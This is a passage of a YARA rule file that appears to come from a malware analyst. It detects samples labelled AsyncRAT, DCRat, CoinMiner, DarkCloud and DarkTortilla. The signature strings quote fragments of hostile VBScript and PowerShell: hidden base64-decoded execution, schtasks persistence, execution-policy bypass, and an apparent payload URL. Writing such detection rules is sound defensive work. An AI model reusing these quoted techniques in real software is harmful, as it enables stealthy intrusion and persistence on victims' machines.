      $s9 = "Save Log" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule be9ddcdedf8c36c64e6b0a32d2686b74a112913c54217ccaa46675bfd1dc82f1_be9ddcde {
   meta:
      description = "_subset_batch - file be9ddcdedf8c36c64e6b0a32d2686b74a112913c54217ccaa46675bfd1dc82f1_be9ddcde.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "be9ddcdedf8c36c64e6b0a32d2686b74a112913c54217ccaa46675bfd1dc82f1"
   strings:
      $x1 = "costura.microsoft.extensions.dependencyinjection.abstractions.dll.compressed|8.0.0.0|Microsoft.Extensions.DependencyInjection.Ab" ascii /* score: '51.00'*/
      $x2 = "costura.microsoft.extensions.dependencyinjection.dll.compressed|8.0.0.0|Microsoft.Extensions.DependencyInjection, Version=8.0.0." ascii /* score: '51.00'*/
      $x3 = "costura.log4net.dll.compressed|2.0.17.0|log4net, Version=2.0.17.0, Culture=neutral, PublicKeyToken=669e0ddf0bb1aa2a|log4net.dll|" ascii /* score: '46.00'*/
      $x4 = "costura.microsoft.net.http.headers.dll.compressed|2.2.8.0|Microsoft.Net.Http.Headers, Version=2.2.8.0, Culture=neutral, PublicKe" ascii /* score: '46.00'*/
      $x5 = "costura.microsoft.extensions.logging.dll.compressed|8.0.0.0|Microsoft.Extensions.Logging, Version=8.0.0.0, Culture=neutral, Publ" ascii /* score: '46.00'*/
      $x6 = "costura.microsoft.extensions.logging.abstractions.dll.compressed|8.0.0.0|Microsoft.Extensions.Logging.Abstractions, Version=8.0." ascii /* score: '46.00'*/
      $x7 = "costura.system.threading.tasks.extensions.dll.compressed|4.2.0.1|System.Threading.Tasks.Extensions, Version=4.2.0.1, Culture=neu" ascii /* score: '44.00'*/
      $x8 = "costura.system.valuetuple.dll.compressed|4.0.3.0|System.ValueTuple, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2" ascii /* score: '44.00'*/
      $x9 = "costura.system.net.http.json.dll.compressed|8.0.0.0|System.Net.Http.Json, Version=8.0.0.0, Culture=neutral, PublicKeyToken=cc7b1" ascii /* score: '44.00'*/
      $x10 = "costura.system.diagnostics.diagnosticsource.dll.compressed|8.0.0.0|System.Diagnostics.DiagnosticSource, Version=8.0.0.0, Culture" ascii /* score: '44.00'*/
      $x11 = "costura.system.numerics.vectors.dll.compressed|4.1.4.0|System.Numerics.Vectors, Version=4.1.4.0, Culture=neutral, PublicKeyToken" ascii /* score: '44.00'*/
      $x12 = "costura.system.memory.dll.compressed|4.0.1.2|System.Memory, Version=4.0.1.2, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51|Sy" ascii /* score: '44.00'*/
      $x13 = "costura.system.buffers.dll.compressed|4.0.3.0|System.Buffers, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51|" ascii /* score: '44.00'*/
      $x14 = "costura.system.text.encodings.web.dll.compressed|8.0.0.0|System.Text.Encodings.Web, Version=8.0.0.0, Culture=neutral, PublicKeyT" ascii /* score: '44.00'*/
      $x15 = "costura.log4net.dll.compressed|2.0.17.0|log4net, Version=2.0.17.0, Culture=neutral, PublicKeyToken=669e0ddf0bb1aa2a|log4net.dll|" ascii /* score: '44.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 17000KB and
      1 of ($x*)
}

rule AsyncRAT_signature_ {
   meta:
      description = "_subset_batch - file AsyncRAT(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "341f907a65858e71db2ae1ba50f6b61c06e2dcd26834aeb3518009f4cd16c152"
   strings:
      $s1 = "Libya and Israel Report.vbs" fullword ascii /* score: '14.00'*/
      $s2 = "ZspY>gY(" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 900KB and
      all of them
}

rule AsyncRAT_signature__2 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dd351746a9cb17a99e8bd6724cc75a1727dfad4070fcd21ebf2da478e282fd89"
   strings:
      $s1 = "Higienico.Run ococomat, 0, True" fullword wide /* score: '16.00'*/
      $s2 = "TnOj = Higienico.ExpandEnvironmentStrings(\"%TEMP%\")" fullword wide /* score: '15.00'*/
      $s3 = "pxufseigaloelasn = pxufseigaloelasn & \"[system.Convert]::FromBase64String( ($LMQGNURcm -replace '" fullword wide /* score: '15.00'*/
      $s4 = "lbkyinuftwpsuixw.Run \"powershell \" & (pxufseigaloelasn) , 0, false" fullword wide /* score: '15.00'*/
      $s5 = "Holoroso = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s6 = "ococomat = \"schtasks /create /tn \" & LLJZ & \" /tr \"\"\" & Tizas & \"\"\" /sc minute /mo 1\"" fullword wide /* score: '14.00'*/
      $s7 = "Higienico.Run Holoroso, 0, True" fullword wide /* score: '13.00'*/
      $s8 = "pxufseigaloelasn = pxufseigaloelasn & \";$fxUKjPDSc = ($fxUKjPDSc -replace '%JkQasDfgrTg%', '\" & replace(CacaPooolsdf,\"\\\",\"" wide /* score: '13.00'*/
      $s9 = "Set Higienico = CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
      $s10 = "pxufseigaloelasn = pxufseigaloelasn & \";$fxUKjPDSc = [system.Text.Encoding]::UTF8.GetString( \"" fullword wide /* score: '12.00'*/
      $s11 = "set lbkyinuftwpsuixw =  CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
      $s12 = "Holoroso = \"schtasks /delete /tn \" & LLJZ & \" /f\"" fullword wide /* score: '11.00'*/
      $s13 = "Tizas = TnOj & \"\\GLPd.vbs\"" fullword wide /* score: '11.00'*/
      $s14 = "' Tenta copiar o arquivo para a pasta tempor" fullword wide /* score: '11.00'*/
      $s15 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 7000KB and
      8 of them
}

rule b62793039aad5767efff78f417b229fa730babc94cc3a77dd20eabc21d3913af_b6279303 {
   meta:
      description = "_subset_batch - file b62793039aad5767efff78f417b229fa730babc94cc3a77dd20eabc21d3913af_b6279303.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b62793039aad5767efff78f417b229fa730babc94cc3a77dd20eabc21d3913af"
   strings:
      $s1 = "lqhslvkcsvxokprg = lqhslvkcsvxokprg & \";$GftsOTSaty = ($GftsOTSaty -replace '%JkQasDfgrTg%', '\" & replace(Popolizio,\"\\\",\"$" wide /* score: '17.00'*/
      $s2 = "lqhslvkcsvxokprg = lqhslvkcsvxokprg & \"[system.Convert]::FromBase64String( ($IuJUJJZz -replace '" fullword wide /* score: '15.00'*/
      $s3 = "orofywjatgdwyhfi.Run \"powershell \" & (lqhslvkcsvxokprg) , 0, false" fullword wide /* score: '15.00'*/
      $s4 = "Popolizio = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s5 = "lqhslvkcsvxokprg = lqhslvkcsvxokprg & \";$GftsOTSaty = [system.Text.Encoding]::UTF8.GetString( \"" fullword wide /* score: '12.00'*/
      $s6 = "set orofywjatgdwyhfi =  CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 1000KB and
      all of them
}

rule DCRat_signature_ {
   meta:
      description = "_subset_batch - file DCRat(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8fbf83ca25c1dff3fb6020b74109b535a3375756381deb67cdca076f70e7f873"
   strings:
      $s1 = "ijdbearksoqhauau = ijdbearksoqhauau & \";$GftsOTSaty = ($GftsOTSaty -replace '%JkQasDfgrTg%', '\" & replace(Popolizio,\"\\\",\"$" wide /* score: '17.00'*/
      $s2 = "ijdbearksoqhauau = ijdbearksoqhauau & \"[system.Convert]::FromBase64String( ($IuJUJJZz -replace '" fullword wide /* score: '15.00'*/
      $s3 = "nbiycuauodofsffc.Run \"powershell \" & (ijdbearksoqhauau) , 0, false" fullword wide /* score: '15.00'*/
      $s4 = "Popolizio = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s5 = "ijdbearksoqhauau = ijdbearksoqhauau & \";$GftsOTSaty = [system.Text.Encoding]::UTF8.GetString( \"" fullword wide /* score: '12.00'*/
      $s6 = "set nbiycuauodofsffc =  CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 1000KB and
      all of them
}

rule DCRat_signature__90262553 {
   meta:
      description = "_subset_batch - file DCRat(signature)_90262553.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "90262553ea98fd405261a952bfc210aaae4629a362c5bbc341fbccf323a860a9"
   strings:
      $s1 = "gjvtbevupmyxxerj = gjvtbevupmyxxerj & \";$GftsOTSaty = ($GftsOTSaty -replace '%JkQasDfgrTg%', '\" & replace(Popolizio,\"\\\",\"$" wide /* score: '17.00'*/
      $s2 = "gjvtbevupmyxxerj = gjvtbevupmyxxerj & \"[system.Convert]::FromBase64String( ($IuJUJJZz -replace '" fullword wide /* score: '15.00'*/
      $s3 = "bwnmqnrhfjnroura.Run \"powershell \" & (gjvtbevupmyxxerj) , 0, false" fullword wide /* score: '15.00'*/
      $s4 = "Popolizio = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s5 = "gjvtbevupmyxxerj = gjvtbevupmyxxerj & \";$GftsOTSaty = [system.Text.Encoding]::UTF8.GetString( \"" fullword wide /* score: '12.00'*/
      $s6 = "set bwnmqnrhfjnroura =  CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 1000KB and
      all of them
}

rule AsyncRAT_signature__3 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f9332d8bae36cd2f3c46e8c09dde70e1bf47a42123c8dcc84c0d4a27a6dd1789"
   strings:
      $s1 = "RankupServicecleaner/read me.txtU" fullword ascii /* score: '14.00'*/
      $s2 = "RankupServicecleaner/read me.txtPK" fullword ascii /* score: '14.00'*/
      $s3 = "RankupServicecleaner/RankupServicefreecleaner.lnk" fullword ascii /* score: '14.00'*/
      $s4 = "RankupServicecleaner/RankupServicefreecleaner.lnkPK" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 4KB and
      all of them
}

rule AsyncRAT_signature__757ace63 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_757ace63.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "757ace638b4bc11c7ab82e6cfcf891e63e2e0a678503ccac100323e3b1f48513"
   strings:
      $s1 = "RankupServiceFreeTemp/RankupServiceFreeTemp.lnk" fullword ascii /* score: '21.00'*/
      $s2 = "dControl/dControl.exe" fullword ascii /* score: '19.00'*/
      $s3 = "RankupServiceFreeTemp/RankupServiceFreeTemp.lnkPK" fullword ascii /* score: '18.00'*/
      $s4 = "RankupServiceFreeTemp/dControl.rar" fullword ascii /* score: '17.00'*/
      $s5 = "RankupServiceFreeTemp/dControl.rarPK" fullword ascii /* score: '14.00'*/
      $s6 = "RankupServiceFreeTemp/blockdriv.rarPK" fullword ascii /* score: '14.00'*/
      $s7 = "RankupServiceFreeTemp/blockdriv.rarRar!" fullword ascii /* score: '14.00'*/
      $s8 = "blockdriv.reg" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      all of them
}

rule AsyncRAT_signature__d431dd96 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_d431dd96.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d431dd969f517d90a1fee4b9f9d6acde4eface0be15032c00f4eac06d6dbdddc"
   strings:
      $s1 = "dControl/dControl.exe" fullword ascii /* score: '19.00'*/
      $s2 = "RankupServicefreecheat/RankupServicefreecheat.lnk" fullword ascii /* score: '14.00'*/
      $s3 = "RankupServicefreecheat/RankupServicefreecheat.lnkPK" fullword ascii /* score: '11.00'*/
      $s4 = "blockdriv.reg" fullword ascii /* score: '10.00'*/
      $s5 = "RankupServicefreecheat/dControl.rar" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      all of them
}

rule AsyncRAT_signature__88f70fb82598484a7ce88eef6418418b_imphash__d6faed6e {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_88f70fb82598484a7ce88eef6418418b(imphash)_d6faed6e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d6faed6e81a811f84357203511bfb3c4c7f27f2f915661d071a5f38e461f84bb"
   strings:
      $x1 = "costura.guna.ui2.dll.compressed|2.0.4.7|Guna.UI2, Version=2.0.4.7, Culture=neutral, PublicKeyToken=8b9d14aa5142e261|Guna.UI2.dll" ascii /* score: '43.00'*/
      $x2 = "costura.costura.dll.compressed|6.0.0.0|Costura, Version=6.0.0.0, Culture=neutral, PublicKeyToken=9919ef960d84173d|Costura.dll|02" ascii /* score: '41.00'*/
      $x3 = "costura.costura.dll.compressed|6.0.0.0|Costura, Version=6.0.0.0, Culture=neutral, PublicKeyToken=9919ef960d84173d|Costura.dll|02" ascii /* score: '39.00'*/
      $x4 = "costura.guna.ui2.dll.compressed|2.0.4.7|Guna.UI2, Version=2.0.4.7, Culture=neutral, PublicKeyToken=8b9d14aa5142e261|Guna.UI2.dll" ascii /* score: '37.00'*/
      $x5 = "iKeyAuth.api+<web_login>d__29, RankupServicecleaner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '35.00'*/
      $x6 = "eKeyAuth.api+<login>d__27, RankupServicecleaner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '35.00'*/
      $x7 = "https://www.epicgames.com/id/login?lang=en-US&noHostRedirect=true&redirectUrl=https%3A%2F%2Fstore.epicgames.com%2Fsite%2Fen-US%2" wide /* score: '35.00'*/
      $x8 = "{spoofer.RankupServicecleaner+<Login_Load>d__25, RankupServicecleaner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '34.00'*/
      $x9 = "hKeyAuth.api+<download>d__46, RankupServicecleaner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '33.00'*/
      $x10 = "cKeyAuth.api+<log>d__47, RankupServicecleaner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '32.00'*/
      $x11 = "gKeyAuth.api+<chatget>d__42, RankupServicecleaner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '32.00'*/
      $x12 = "LOADERX64.dll" fullword ascii /* score: '32.00'*/
      $x13 = "fKeyAuth.api+<getvar>d__37, RankupServicecleaner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '32.00'*/
      $x14 = "fKeyAuth.api+<logout>d__28, RankupServicecleaner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '32.00'*/
      $x15 = " -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden" fullword wide /* score: '31.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*)
}

rule CoinMiner_signature__13ba1e684000daf3f8f94515c353c684_imphash_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_13ba1e684000daf3f8f94515c353c684(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "00bf2ed95e76e2b92d466cfa86494743aaa54d9292fe44b58ecb45a46fdfea96"
   strings:
      $s1 = "[-] Failed to get kernel32.dll handle." fullword ascii /* score: '28.00'*/
      $s2 = "[DEFENSE] ERROR: Failed to get handle for ntdll.dll post-unhooking." fullword ascii /* score: '24.00'*/
      $s3 = "\\KnownDlls\\ntdll.dll" fullword wide /* score: '21.00'*/
      $s4 = "[+] Got kernel32.dll handle." fullword ascii /* score: '20.00'*/
      $s5 = "[+] Got resource size. Passing to ReflectiveLoader." fullword ascii /* score: '20.00'*/
      $s6 = "[DEFENSE] ETW disabling process completed successfully." fullword ascii /* score: '18.00'*/
      $s7 = "kkkhkhh" fullword ascii /* reversed goodware string 'hhkhkkk' */ /* score: '18.00'*/
      $s8 = "kkkkkki" fullword ascii /* reversed goodware string 'ikkkkkk' */ /* score: '18.00'*/
      $s9 = "ckkkckkko" fullword ascii /* base64 encoded string 'rI$rI$' */ /* score: '18.00'*/
      $s10 = "ffffffffp" fullword ascii /* reversed goodware string 'pffffffff' */ /* score: '18.00'*/
      $s11 = "LDDDDDD" fullword ascii /* reversed goodware string 'DDDDDDL' */ /* score: '16.50'*/
      $s12 = "ODDDDDD" fullword ascii /* reversed goodware string 'DDDDDDO' */ /* score: '16.50'*/
      $s13 = "JDDDDDD" fullword ascii /* reversed goodware string 'DDDDDDJ' */ /* score: '16.50'*/
      $s14 = "MDDDDDD" fullword ascii /* reversed goodware string 'DDDDDDM' */ /* score: '16.50'*/
      $s15 = "[Loader] ERROR: VirtualAlloc failed for writable payload buffer." fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 19000KB and
      8 of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__05ecee49 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_05ecee49.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "05ecee491f2c05db5d2dca03960d63b671293a388aaa9dcc7fdbb5814b4fb992"
   strings:
      $s1 = "WebBrowser Execution Timeout Expired. The timeout period elapsed prior to completion of the operation. To avoid this error, incr" wide /* score: '27.00'*/
      $s2 = "LoadAndExecuteAssemblyCommand" fullword ascii /* score: '22.00'*/
      $s3 = "Lzcjeaxxyri.exe" fullword wide /* score: '22.00'*/
      $s4 = "get_ParseExecuting" fullword ascii /* score: '21.00'*/
      $s5 = "Execution failed: " fullword wide /* score: '19.00'*/
      $s6 = "DownloadFileCommand" fullword ascii /* score: '18.00'*/
      $s7 = "<ParseExecuting>k__BackingField" fullword ascii /* score: '16.00'*/
      $s8 = "set_ParseExecuting" fullword ascii /* score: '16.00'*/
      $s9 = "ParseExecuting" fullword ascii /* score: '16.00'*/
      $s10 = "GetSharedHttpClient" fullword ascii /* score: '15.00'*/
      $s11 = "System.Collections.Generic.IEnumerable<HtmlAgilityPack.HtmlAttribute>.GetEnumerator" fullword ascii /* score: '15.00'*/
      $s12 = "System.Collections.Generic.IEnumerator<HtmlAgilityPack.HtmlAttribute>.get_Current" fullword ascii /* score: '15.00'*/
      $s13 = "System.Collections.Generic.IEnumerator<HtmlAgilityPack.HtmlNode>.get_Current" fullword ascii /* score: '15.00'*/
      $s14 = "<GetSharedHttpClient>b__0" fullword ascii /* score: '15.00'*/
      $s15 = "System.Collections.Generic.IEnumerable<HtmlAgilityPack.HtmlNode>.GetEnumerator" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5cefab9b {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5cefab9b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5cefab9bcb779f1d7b9842cb4d822fd010f825f2eefc93e53d6726dd0d916cce"
   strings:
      $s1 = "asyneeee.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://systemwindowsupdate.com/min/Gihkrbxw.pdf" fullword wide /* score: '20.00'*/
      $s3 = "Command failed: " fullword wide /* score: '15.00'*/
      $s4 = "FxResources.System.ValueTuple.SR" fullword wide /* score: '14.00'*/
      $s5 = "Pipeline failed" fullword wide /* score: '13.00'*/
      $s6 = "{bab331ab-3882-4bea-aab1-9e3b380ddf8f}, PublicKeyToken=3e56350693f7355e" fullword wide /* score: '13.00'*/
      $s7 = "GetRuntimeField" fullword ascii /* score: '12.00'*/
      $s8 = "GetRuntimeMethods" fullword ascii /* score: '12.00'*/
      $s9 = "GetRuntimeMethod" fullword ascii /* score: '12.00'*/
      $s10 = "GetRuntimeFields" fullword ascii /* score: '12.00'*/
      $s11 = "GetRuntimeProperty" fullword ascii /* score: '12.00'*/
      $s12 = "GetRuntimeProperties" fullword ascii /* score: '12.00'*/
      $s13 = "All commands completed successfully" fullword wide /* score: '12.00'*/
      $s14 = "WriteFixedMapHeaderUnsafe" fullword wide /* score: '12.00'*/
      $s15 = "WriteFixedArrayHeaderUnsafe" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule b86e2a281e460bbc937119b3070447ff4af934e9a57eab8fe53ad52e8460dc57_b86e2a28 {
   meta:
      description = "_subset_batch - file b86e2a281e460bbc937119b3070447ff4af934e9a57eab8fe53ad52e8460dc57_b86e2a28.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b86e2a281e460bbc937119b3070447ff4af934e9a57eab8fe53ad52e8460dc57"
   strings:
      $s1 = "PDFSkillsApp.exe" fullword wide /* score: '22.00'*/
      $s2 = "CPDFSkillsApp, Version=4.0.0.2, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '21.00'*/
      $s3 = "!http://ocsp.globalsign.com/rootr30;" fullword ascii /* score: '20.00'*/
      $s4 = "0NativeTemplate.Convertor+<GetTskStreamAsync>d__8" fullword ascii /* score: '19.00'*/
      $s5 = "get_ShouldShowLoaderIcon" fullword ascii /* score: '18.00'*/
      $s6 = "NativeTemplate.App" fullword ascii /* score: '17.00'*/
      $s7 = "https://rnd.skillcli.com/api/convert/" fullword wide /* score: '17.00'*/
      $s8 = "-http://ocsp.globalsign.com/codesigningrootr450F" fullword ascii /* score: '16.00'*/
      $s9 = ":http://secure.globalsign.com/cacert/codesigningrootr45.crt0A" fullword ascii /* score: '16.00'*/
      $s10 = "%http://crl.globalsign.com/root-r3.crl0G" fullword ascii /* score: '16.00'*/
      $s11 = "/http://secure.globalsign.com/cacert/root-r3.crt06" fullword ascii /* score: '16.00'*/
      $s12 = "/RC/loader.png" fullword ascii /* score: '16.00'*/
      $s13 = "0http://crl.globalsign.com/codesigningrootr45.crl0U" fullword ascii /* score: '16.00'*/
      $s14 = "rc/loader.png" fullword wide /* score: '16.00'*/
      $s15 = "get_TargetFileExtension" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule dca59f2171468be3011319f6216cff747de196be0aa347d8dbb080afbd2b330e_dca59f21 {
   meta:
      description = "_subset_batch - file dca59f2171468be3011319f6216cff747de196be0aa347d8dbb080afbd2b330e_dca59f21.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dca59f2171468be3011319f6216cff747de196be0aa347d8dbb080afbd2b330e"
   strings:
      $s1 = "C:\\jenkins-runner\\workspace\\Bakin_Steam_Release_Build\\src\\Yukar Engine Launcher\\obj\\Release\\bakinplayer_launcher.pdb" fullword ascii /* score: '25.00'*/
      $s2 = "CSteamworks.dll" fullword wide /* score: '23.00'*/
      $s3 = "Steamworks.NET.dll" fullword wide /* score: '23.00'*/
      $s4 = "bakinplayer.exe" fullword wide /* score: '22.00'*/
      $s5 = "bakinplayer_launcher.exe" fullword wide /* score: '19.00'*/
      $s6 = "doExecuteEngine" fullword ascii /* score: '18.00'*/
      $s7 = "failedLog" fullword ascii /* score: '12.00'*/
      $s8 = "Steamworks.NET" fullword ascii /* score: '10.00'*/
      $s9 = ".NET Framework 4.6.28" fullword ascii /* score: '10.00'*/
      $s10 = ".NETFramework,Version=v4.6.2" fullword ascii /* score: '10.00'*/
      $s11 = "unpack.zip" fullword wide /* score: '10.00'*/
      $s12 = "HEADER_SIZE" fullword ascii /* score: '9.00'*/
      $s13 = " 2022-2024 SmileBoom Co.Ltd. All Rights Reserved." fullword wide /* score: '9.00'*/
      $s14 = "SmileBoom Co.Ltd." fullword wide /* score: '9.00'*/
      $s15 = "getCodes" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "55e4b7a153904d1ef5c2e42584e5f5b0bacc1352a9ab7f9b108b66dd7032a280"
   strings:
      $s1 = "This will attempt to enable System Protection. You may need administrator privileges. Continue?" fullword wide /* score: '23.00'*/
      $s2 = "SLmg.exe" fullword wide /* score: '22.00'*/
      $s3 = "https://github.com" fullword wide /* score: '21.00'*/
      $s4 = "GetSystemProtectionStatus" fullword ascii /* score: '19.00'*/
      $s5 = "Failed to enable System Protection. Please check your administrator privileges." fullword wide /* score: '17.00'*/
      $s6 = "{0:yyyy-MM-dd HH:mm:ss} - {1}" fullword wide /* score: '15.00'*/
      $s7 = "lblSystemProtectionStatus" fullword wide /* score: '14.00'*/
      $s8 = "SLmg.pdb" fullword ascii /* score: '14.00'*/
      $s9 = "chkSystemProtection" fullword wide /* score: '14.00'*/
      $s10 = "btnEnableSystemProtection_Click" fullword ascii /* score: '14.00'*/
      $s11 = "grpSystemProtection" fullword wide /* score: '14.00'*/
      $s12 = "btnEnableSystemProtection" fullword wide /* score: '14.00'*/
      $s13 = "IsSystemProtectionEnabled" fullword ascii /* score: '14.00'*/
      $s14 = "SELECT * FROM SystemRestoreConfig" fullword wide /* score: '14.00'*/
      $s15 = "Failed to create restore point. Please ensure you have administrator privileges." fullword wide /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ae0f0970 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ae0f0970.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ae0f097042a238c4047013e08ca82bff3ba379a3112848e00b6cd83dcea527a5"
   strings:
      $s1 = "Intasuranfe.exe" fullword wide /* score: '22.00'*/
      $s2 = "PENDIENTE" fullword wide /* base64 encoded string '<CC CS' */ /* score: '16.50'*/
      $s3 = "SELECT test.TES_ID, CASE when TES_TIPO = 'Examen' then  ('** ' + TES_NOMBRE + ' **') when TES_TIPO = 'Parametro' then  ('  --> '" wide /* score: '16.00'*/
      $s4 = "select test.TES_ID, CASE when TES_TIPO = 'Examen' then  ('** ' + TES_NOMBRE + ' **') when TES_TIPO = 'Parametro' then  ('  --> '" wide /* score: '13.00'*/
      $s5 = "delete from i_temp_stock;" fullword wide /* score: '11.00'*/
      $s6 = "Insert into i_temp_stock values ('" fullword wide /* score: '11.00'*/
      $s7 = "select * from tipo_autocompletar where auto_nombre = '" fullword wide /* score: '11.00'*/
      $s8 = ".NET Framework 4.6" fullword ascii /* score: '10.00'*/
      $s9 = "System.Windows.Forms.Form" fullword ascii /* score: '10.00'*/
      $s10 = "AUTOCOMPLETE" fullword wide /* score: '9.50'*/
      $s11 = "COMENTARIO" fullword wide /* score: '9.50'*/
      $s12 = "REPORTADO" fullword wide /* score: '9.50'*/
      $s13 = "TabConTrat" fullword wide /* score: '9.00'*/
      $s14 = "No se pudo realizar la operaci" fullword wide /* score: '9.00'*/
      $s15 = "n solicitada, Operaci" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule DarkTortilla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file DarkTortilla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "08a8e7cf3bd02374a1840f62ca1be3f8f0d5a5a2419f53ab3b400c38b5b0d448"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADCF" fullword ascii /* score: '27.00'*/
      $s2 = "Data Source=(LocalDB)\\MSSQLLocalDB;AttachDbFilename=C:\\Users\\kathlene\\source\\repos\\capstoneProject2ndYear\\capstoneProject" wide /* score: '23.00'*/
      $s3 = "Gelanopixenaf.exe" fullword wide /* score: '22.00'*/
      $s4 = "INSERT INTO ProductTb4 (referenceNumber, Customer_Name, Contact_Number, Address, Product_Order, Date, Payment_Status, Total, Pay" wide /* score: '14.00'*/
      $s5 = "INSERT INTO OrderReceived (refNum, Customer_Name, [Date], Total, id, Contact_Number, Address, Product_Order) VALUES (@refNum, @C" wide /* score: '14.00'*/
      $s6 = "INSERT INTO OrderReceived (refNum, Customer_Name, [Date], Total, id, Contact_Number, Address) VALUES (@refNum, @Customer_Name, G" wide /* score: '14.00'*/
      $s7 = "getmethods" fullword wide /* score: '13.00'*/
      $s8 = "You are not allowed to do this transaction!!!" fullword wide /* score: '13.00'*/
      $s9 = "lblUserLog" fullword wide /* score: '12.00'*/
      $s10 = "PrintPreviewDialog1.Icon" fullword wide /* score: '12.00'*/
